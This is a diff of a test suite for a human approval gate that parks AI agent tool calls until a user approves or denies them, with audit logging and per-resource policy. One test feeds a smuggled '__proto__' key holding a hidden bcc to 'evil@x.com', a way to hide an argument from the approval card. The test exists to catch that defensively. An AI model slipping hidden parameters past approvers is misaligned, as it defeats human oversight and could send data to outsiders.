+    ).json();
+    expect(textOf(list.approvals[0].argsSummary.body)).toBe(body);
+    expect(list.approvals[0].argsSummary.subject).toBe("x⟨U+D83D⟩y");
+  });
+
+  // zod's z.record drops a top-level "__proto__" key (it rebuilds the object by
+  // assignment), so a digest and a card built from it would describe a call
+  // without it while the tool receives the raw JSON.
+  it("binds and shows a top-level __proto__ key the tool would receive", async () => {
+    const params = JSON.parse('{"recordId":5,"__proto__":{"bcc":"evil@x.com"}}');
+    await gateCheck(gateReq(gateBody({ params })));
+    const [row] = await db.select().from(toolApproval).where(eq(toolApproval.agentId, agent.id));
+    expect(row.argsDigest).toBe(computeArgsDigest(params));
+    expect(row.argsDigest).not.toBe(computeArgsDigest({ recordId: 5 }));
+
+    setSession(user);
+    const list = await (
+      await listApprovals(new NextRequest("http://localhost/api/approvals"), {})
+    ).json();
+    expect(Object.keys(list.approvals[0].argsSummary)).toContain("__proto__");
+    expect(JSON.stringify(list.approvals[0].argsSummary)).toContain("evil@x.com");
+  });
+
+  it("does not list expired pending confirmations (no dead cards in the inbox)", async () => {
+    await db.insert(toolApproval).values({
+      agentId: agent.id,
+      requesterId: user.id,
+      sessionKey: sessionKey(),
+      toolName: "odoo_write",
+      argsDigest: "stale-digest",
+      tier: "confirm",
+      status: "pending",
+      expiresAt: new Date(Date.now() - 1000),
+    });
+    setSession(user);
+    const list = await (
+      await listApprovals(new NextRequest("http://localhost/api/approvals"), {})
+    ).json();
+    expect(list.approvals).toHaveLength(0);
+  });
+
+  it("approve → agent retry consumes the ticket + full audit lifecycle", async () => {
+    const blocked = await (await gateCheck(gateReq(gateBody()))).json();
+    setSession(user);
+    const dec = await decide(decideReq({ decision: "approve" }), ctx(blocked.requestId));
+    expect(dec.status).toBe(200);
+
+    const allow = await (await gateCheck(gateReq(gateBody()))).json();
+    expect(allow.decision).toBe("allow");
+    const [row] = await db
+      .select()
+      .from(toolApproval)
+      .where(eq(toolApproval.id, blocked.requestId));
+    expect(row.status).toBe("consumed");
+
+    await flushAfter();
+    for (const eventType of [
+      "approval.requested",
+      "approval.granted",
+      "approval.consumed",
+    ] as const) {
+      expect(
+        await db.select().from(auditLog).where(eq(auditLog.eventType, eventType)),
+        eventType
+      ).toHaveLength(1);
+    }
+  });
+
+  it("forbids a different user from approving (self-confirm)", async () => {
+    const blocked = await (await gateCheck(gateReq(gateBody()))).json();
+    const other = await seedUser();
+    setSession(other);
+    const res = await decide(decideReq({ decision: "approve" }), ctx(blocked.requestId));
+    expect(res.status).toBe(403);
+  });
+
+  describe("on a member's personal agent while members may not use one", () => {
+    beforeEach(async () => {
+      await db.update(agents).set({ isPersonal: true }).where(eq(agents.id, agent.id));
+    });
+
+    it("refuses an approval — it would resume a run on an agent the admin switched off", async () => {
+      const blocked = await (await gateCheck(gateReq(gateBody()))).json();
+      await setInstancePolicy({ memberPersonalAgents: false, memberAutomations: true });
+      setSession(user);
+
+      const res = await decide(decideReq({ decision: "approve" }), ctx(blocked.requestId));
+
+      expect(res.status).toBe(403);
+      expect((await res.json()).code).toBe("personal_agent_disabled");
+      const [row] = await db
+        .select()
+        .from(toolApproval)
+        .where(eq(toolApproval.id, blocked.requestId));
+      expect(row.status).toBe("pending");
+      expect(gatewayRequest).not.toHaveBeenCalled();
+    });
+
+    it("still takes a denial — stopping is never what the policy is against", async () => {
+      const blocked = await (await gateCheck(gateReq(gateBody()))).json();
+      await setInstancePolicy({ memberPersonalAgents: false, memberAutomations: true });
+      setSession(user);
+
+      const res = await decide(decideReq({ decision: "deny" }), ctx(blocked.requestId));
+
+      expect(res.status).toBe(200);
+    });
+  });
+
+  it("returns 404 for an unknown request id", async () => {
+    setSession(user);
+    const res = await decide(
+      decideReq({ decision: "approve" }),
+      ctx("00000000-0000-4000-8000-000000000000")
+    );
+    expect(res.status).toBe(404);
+  });
+
+  // #1132. `requireApproval` parks the call inside OpenClaw's hook; flipping the
+  // row does nothing to that wait. These four cover the only thing the user
+  // actually cares about: did the run continue, and were they told the truth.
+  describe("resuming the parked run", () => {
+    /** Gate-check, then record the approval OpenClaw broadcast for that call —
+     * what `attachPluginApprovalBridge` does on a live gateway. */
+    async function blockedAndLinked(approvalId = "plugin:abc") {
+      const blocked = await (
+        await gateCheck(gateReq({ ...gateBody(), toolCallId: "call_7" }))
+      ).json();
+      await linkApproval({ approvalId, toolCallId: "call_7" });
+      setSession(user);
+      return blocked;
+    }
+
+    it("resolves the parked call so the tool actually runs", async () => {
+      const blocked = await blockedAndLinked();
+
+      const res = await decide(decideReq({ decision: "approve" }), ctx(blocked.requestId));
+
+      expect(gatewayRequest).toHaveBeenCalledWith("plugin.approval.resolve", {
+        id: "plugin:abc",
+        decision: "allow-once",
+      });
+      expect(await res.json()).toMatchObject({ ok: true, resumed: true });
+    });
+
+    it("denies the parked call rather than leaving it to time out", async () => {
+      const blocked = await blockedAndLinked();
+
+      await decide(decideReq({ decision: "deny" }), ctx(blocked.requestId));
+
+      expect(gatewayRequest).toHaveBeenCalledWith("plugin.approval.resolve", {
+        id: "plugin:abc",
+        decision: "deny",
+      });
+    });
+
+    // The decision IS persisted, so this is not a 500 — a retry would only
+    // 409. But reporting a bare `ok` would tell the user their approval went
+    // through while the run stays parked until it times out.
+    it("tells the user when the decision could not reach the run", async () => {
+      gatewayRequest.mockResolvedValue({ ok: false, error: { message: "approval not found" } });
+      const blocked = await blockedAndLinked();
+
+      const res = await decide(decideReq({ decision: "approve" }), ctx(blocked.requestId));
+
+      expect(res.status).toBe(200);
+      const body = await res.json();
+      expect(body.resumed).toBe(false);
+      expect(body.resumeError).toBeTruthy();
+
+      // The user's decision still stands — it is the delivery that failed.
+      const [row] = await db
+        .select()
+        .from(toolApproval)
+        .where(eq(toolApproval.id, blocked.requestId));
+      expect(row.status).toBe("approved");
+
+      // And the audit says the grant did not reach the run, rather than
+      // recording a success that never happened.
+      await flushAfter();
+      const [entry] = await db
+        .select()
+        .from(auditLog)
+        .where(eq(auditLog.eventType, "approval.granted"));
+      expect(entry.outcome).toBe("failure");
+      expect(entry.detail).toMatchObject({ resumed: false });
+    });
+
+    /**
+     * The decision can beat the broadcast, and this is not a hypothetical: the
+     * gate writes `approval.requested` inside gate-check, so the card is
+     * actionable a full `plugin.approval.request` round trip before Pinchy
+     * learns OpenClaw's id. It made the approvals E2E flake — and it was not
+     * merely a lost race, because the route flips the row before resolving, so
+     * a broadcast arriving after that found a row that was no longer `pending`
+     * and could never link at all. The user got "the agent is no longer waiting
+     * for this decision" about a run that was still parked.
+     */
+    it("waits for the broadcast when the decision gets there first", async () => {
+      const blocked = await (
+        await gateCheck(gateReq({ ...gateBody(), toolCallId: "call_race" }))
+      ).json();
+      setSession(user);
+      // The broadcast lands mid-decision, exactly as it does on a loaded runner.
+      setTimeout(() => {
+        void linkApproval({ approvalId: "plugin:raced", toolCallId: "call_race" });
+      }, 80);
+
+      const res = await decide(decideReq({ decision: "approve" }), ctx(blocked.requestId));
+
+      expect(gatewayRequest).toHaveBeenCalledWith("plugin.approval.resolve", {
+        id: "plugin:raced",
+        decision: "allow-once",
+      });
+      expect(await res.json()).toMatchObject({ resumed: true });
+    });
+
+    it("does not call the gateway when no run is parked on that call", async () => {
+      // No approval id on the row: the gate refused without suspending, the
+      // approval already timed out, or the row predates #1132.
+      const blocked = await (await gateCheck(gateReq(gateBody()))).json();
+      setSession(user);
+
+      const res = await decide(decideReq({ decision: "approve" }), ctx(blocked.requestId));
+
+      expect(gatewayRequest).not.toHaveBeenCalled();
+      expect(await res.json()).toMatchObject({ resumed: false });
+    });
+  });
+
+  it("deny records the reason and keeps the agent's retry blocked", async () => {
+    const blocked = await (await gateCheck(gateReq(gateBody()))).json();
+    setSession(user);
+    await decide(decideReq({ decision: "deny", reason: "wrong record" }), ctx(blocked.requestId));
+
+    const [row] = await db
+      .select()
+      .from(toolApproval)
+      .where(eq(toolApproval.id, blocked.requestId));
+    expect(row.status).toBe("denied");
+    expect(row.decisionReason).toBe("wrong record");
+
+    const retry = await (await gateCheck(gateReq(gateBody()))).json();
+    expect(retry.decision).toBe("block");
+  });
+
+  // `detail` is stored verbatim in an immutable, HMAC-chained row that GDPR
+  // crypto-erasure cannot rewrite; only the `actorId` column is pseudonymized
+  // (#824). So no approval row may carry the person's raw users.id — not as the
+  // requester, not as the approver — and an address typed into a denial's
+  // free-text reason is scrubbed before it is written.
+  describe("the user's raw id never reaches an approval audit row (#1273)", () => {
+    async function approvalRows() {
+      await flushAfter();
+      return db.select().from(auditLog).where(like(auditLog.eventType, "approval.%"));
+    }
+    function expectNoRawUserId(rows: Awaited<ReturnType<typeof approvalRows>>) {
+      expect(rows.length).toBeGreaterThan(0);
+      for (const row of rows) {
+        expect(JSON.stringify(row.detail), row.eventType).not.toContain(user.id);
+        expect((row.detail as { requester?: unknown }).requester, row.eventType).toEqual({
+          name: "U",
+        });
+      }
+    }
+
+    it("on a request, its approval and the consumed grant", async () => {
+      const blocked = await (await gateCheck(gateReq(gateBody()))).json();
+      // A session name distinct from the DB name, so the test can tell which
+      // source each snapshot was taken from.
+      setSession(user, "Session U");
+      await decide(decideReq({ decision: "approve" }), ctx(blocked.requestId));
+      await gateCheck(gateReq(gateBody()));
+
+      const rows = await approvalRows();
+      expect(rows.map((r) => r.eventType).sort()).toEqual([
+        "approval.consumed",
+        "approval.granted",
+        "approval.requested",
+      ]);
+      expectNoRawUserId(rows);
+      const granted = rows.find((r) => r.eventType === "approval.granted")!;
+      expect((granted.detail as { approver?: unknown }).approver).toEqual({ name: "Session U" });
+      // The approver is still identifiable: as the row's actor, pseudonymized
+      // on write — so not the raw id there either.
+      expect(granted.actorType).toBe("user");
+      expect(granted.actorId).not.toBe(user.id);
+    });
+
+    it("on a denial, with an address in its reason scrubbed", async () => {
+      const blocked = await (await gateCheck(gateReq(gateBody()))).json();
+      setSession(user);
+      await decide(
+        decideReq({ decision: "deny", reason: "wrong partner, ask jane.doe@example.com" }),
+        ctx(blocked.requestId)
+      );
+
+      const rows = await approvalRows();
+      expectNoRawUserId(rows);
+      const denied = rows.find((r) => r.eventType === "approval.denied")!;
+      expect((denied.detail as { reason?: unknown }).reason).toBe(
+        "wrong partner, ask <email-redacted>"
+      );
+      expect(JSON.stringify(denied.detail)).not.toContain("jane.doe");
+    });
+
+    it("on a resolution the runtime reports", async () => {
+      await gateCheck(gateReq({ ...gateBody(), toolCallId: "call_9" }));
+      await reportResolution(
+        new NextRequest("http://localhost/api/internal/approvals/resolution", {
+          method: "POST",
+          headers: { "content-type": "application/json", Authorization: `Bearer ${GW}` },
+          body: JSON.stringify({ toolCallId: "call_9", decision: "timeout" }),
+        })
+      );
+
+      const rows = await approvalRows();
+      expect(rows.map((r) => r.eventType).sort()).toEqual([
+        "approval.expired",
+        "approval.requested",
+      ]);
+      expectNoRawUserId(rows);
+    });
+
+    it("on a refused call", async () => {
+      agent = await seedAgent(user.id, ["pinchy_write"]);
+      await gateCheck(
+        gateReq(
+          gateBody({
+            toolName: "pinchy_write",
+            params: { path: "/data/out/a.md", content: "x".repeat(250_000) },
+          })
+        )
+      );
+
+      const rows = await approvalRows();
+      expect(rows.map((r) => r.eventType)).toEqual(["approval.refused"]);
+      expectNoRawUserId(rows);
+    });
+  });
+
+  // #1132. `onResolution` is the runtime reporting what it DID. It is the only
+  // channel for the outcomes nobody clicks — and, since an approved call
+  // resumes inside the hook and never passes the gate again, the only thing
+  // that can still record a grant as spent.
+  describe("resolution reporting", () => {
+    function resolutionReq(body: object, token: string | null = GW) {
+      return new NextRequest("http://localhost/api/internal/approvals/resolution", {
+        method: "POST",
+        headers: {
+          "content-type": "application/json",
+          ...(token ? { Authorization: `Bearer ${token}` } : {}),
+        },
+        body: JSON.stringify(body),
+      });
+    }
+
+    it("rejects a report without the gateway token", async () => {
+      const res = await reportResolution(
+        resolutionReq({ toolCallId: "c", decision: "deny" }, null)
+      );
+      expect(res.status).toBe(401);
+    });
+
+    it("records an allowed call as a spent grant", async () => {
+      const blocked = await (
+        await gateCheck(gateReq({ ...gateBody(), toolCallId: "call_7" }))
+      ).json();
+      setSession(user);
+      await decide(decideReq({ decision: "approve" }), ctx(blocked.requestId));
+
+      const res = await reportResolution(
+        resolutionReq({ toolCallId: "call_7", decision: "allow-once" })
+      );
+
+      expect(res.status).toBe(200);
+      const [row] = await db
+        .select()
+        .from(toolApproval)
+        .where(eq(toolApproval.id, blocked.requestId));
+      expect(row.status).toBe("consumed");
+
+      await flushAfter();
+      const consumed = await db
+        .select()
+        .from(auditLog)
+        .where(eq(auditLog.eventType, "approval.consumed"));
+      expect(consumed).toHaveLength(1);
+      expect(consumed[0].detail).toMatchObject({ resolution: "allow-once" });
+    });
+
+    it("closes out a confirmation the run stopped waiting for", async () => {
+      const blocked = await (
+        await gateCheck(gateReq({ ...gateBody(), toolCallId: "call_7" }))
+      ).json();
+
+      await reportResolution(resolutionReq({ toolCallId: "call_7", decision: "timeout" }));
+
+      const [row] = await db
+        .select()
+        .from(toolApproval)
+        .where(eq(toolApproval.id, blocked.requestId));
+      expect(row.status).toBe("expired");
+      await flushAfter();
+      expect(
+        await db.select().from(auditLog).where(eq(auditLog.eventType, "approval.expired"))
+      ).toHaveLength(1);
+    });
+
+    // The decision route already flipped and audited this one. A second audit
+    // row for the same act would double-count in the trail.
+    it("writes nothing when the user's own decision already settled it", async () => {
+      const blocked = await (
+        await gateCheck(gateReq({ ...gateBody(), toolCallId: "call_7" }))
+      ).json();
+      setSession(user);
+      await decide(decideReq({ decision: "deny" }), ctx(blocked.requestId));
+      await flushAfter();
+
+      await reportResolution(resolutionReq({ toolCallId: "call_7", decision: "deny" }));
+      await flushAfter();
+
+      expect(
+        await db.select().from(auditLog).where(eq(auditLog.eventType, "approval.denied"))
+      ).toHaveLength(1);
+    });
+
+    // A tool call id is only as unique as the model provider makes it — several
+    // self-hosted OpenAI-compatible servers number them per response — so the
+    // gate reports the session alongside it. This is the wiring (schema field,
+    // route destructuring, service argument) that the service test sees only
+    // half of: drop it anywhere along the way and the report silently widens
+    // back to "any row with this call id".
+    it("settles only the session the runtime reported on", async () => {
+      const mine = await (await gateCheck(gateReq({ ...gateBody(), toolCallId: "call_0" }))).json();
+      const theirs = await (
+        await gateCheck(
+          gateReq({
+            ...gateBody(),
+            sessionKey: `${sessionKey()}:other-chat`,
+            toolCallId: "call_0",
+          })
+        )
+      ).json();
+      expect(theirs.requestId).not.toBe(mine.requestId);
+
+      await reportResolution(
+        resolutionReq({ toolCallId: "call_0", sessionKey: sessionKey(), decision: "timeout" })
+      );
+
+      const rows = await db.select().from(toolApproval);
+      const byId = Object.fromEntries(rows.map((r) => [r.id, r.status]));
+      expect(byId[mine.requestId]).toBe("expired");
+      expect(byId[theirs.requestId]).toBe("pending");
+    });
+
+    // The same approval machinery carries OpenClaw's own requests (skill
+    // workshop, exec). Those name calls Pinchy never opened a row for, so this
+    // is the ordinary case rather than an error.
+    it("accepts a report for a call nobody was waiting on", async () => {
+      const res = await reportResolution(
+        resolutionReq({ toolCallId: "call_not_ours", decision: "allow-once" })
+      );
+      expect(res.status).toBe(200);
+      await flushAfter();
+      expect(await db.select().from(auditLog)).toHaveLength(0);
+    });
+  });
+
+  /**
+   * #1133: the policy resolves per resource, not only per tool. These run at
+   * route level because that is where the three pieces meet — the stored
+   * config, the model read out of the call, and the resolution rule. Each unit
+   * test sees only one of them.
+   *
+   * Note that every OTHER test in this file seeds `confirmTools`, the pre-#1133
+   * shape. That is deliberate and is the migration evidence agent-rules/testing.md § "Test
+   * Migrations Against Pre-Existing Data" asks for: the suite proves an agent
+   * configured before the switch still gets gated by the new code, using the
+   * new code's own route.
+   */
+  describe("per-resource policy", () => {
+    async function seedWithConfirm(confirm: Record<string, "confirm" | "allow">) {
+      const [a] = await db
+        .insert(agents)
+        .values({
+          name: "Per-model",
+          model: "anthropic/claude-haiku-4-5-20251001",
+          greetingMessage: "Hi",
+          ownerId: user.id,
+          pluginConfig: { "pinchy-approvals": { confirm } },
+        })
+        .returning();
+      return a;
+    }
+    const check = (agentId: string, toolName: string, params: object) =>
+      gateCheck(
+        gateReq({
+          agentId,
+          sessionKey: `agent:${agentId}:direct:${user.id}`,
+          toolName,
+          params,
+        })
+      ).then((r) => r.json());
+
+    it("exempts one model from a tool that is otherwise gated", async () => {
+      const a = await seedWithConfirm({
+        odoo_delete: "confirm",
+        "odoo_delete:note.note": "allow",
+      });
+      expect((await check(a.id, "odoo_delete", { model: "note.note", ids: [1] })).decision).toBe(
+        "allow"
+      );
+      expect((await check(a.id, "odoo_delete", { model: "account.move", ids: [1] })).decision).toBe(
+        "block"
+      );
+    });
+
+    // The rule that keeps a per-model grid from becoming an allowlist: a model
+    // nobody has ticked inherits the tool setting. If it defaulted to allow, a
+    // model added after the admin configured the agent would arrive ungated.
+    it("gates a model the admin never ticked, because it inherits the tool", async () => {
+      const a = await seedWithConfirm({
+        odoo_delete: "confirm",
+        "odoo_delete:note.note": "allow",
+      });
+      const res = await check(a.id, "odoo_delete", { model: "a.model.nobody.ticked", ids: [1] });
+      expect(res.decision).toBe("block");
+    });
+
+    it("gates a single model while leaving the tool itself open", async () => {
+      const a = await seedWithConfirm({ "odoo_write:account.move": "confirm" });
+      expect((await check(a.id, "odoo_write", { model: "res.partner", values: {} })).decision).toBe(
+        "allow"
+      );
+      expect(
+        (await check(a.id, "odoo_write", { model: "account.move", values: {} })).decision
+      ).toBe("block");
+    });
+
+    // Without the model on the card, "Delete a record in Odoo" is not a
+    // decision anyone can make — which would make the whole setting pointless
+    // for the person it exists to inform.
+    it("names the resource on the card the person reads", async () => {
+      const a = await seedWithConfirm({ odoo_delete: "confirm" });
+      const res = await check(a.id, "odoo_delete", { model: "account.move", ids: [1] });
+      expect(res.decision).toBe("block");
+      expect(res.approval.title).toContain("account.move");
+    });
+  });
+});
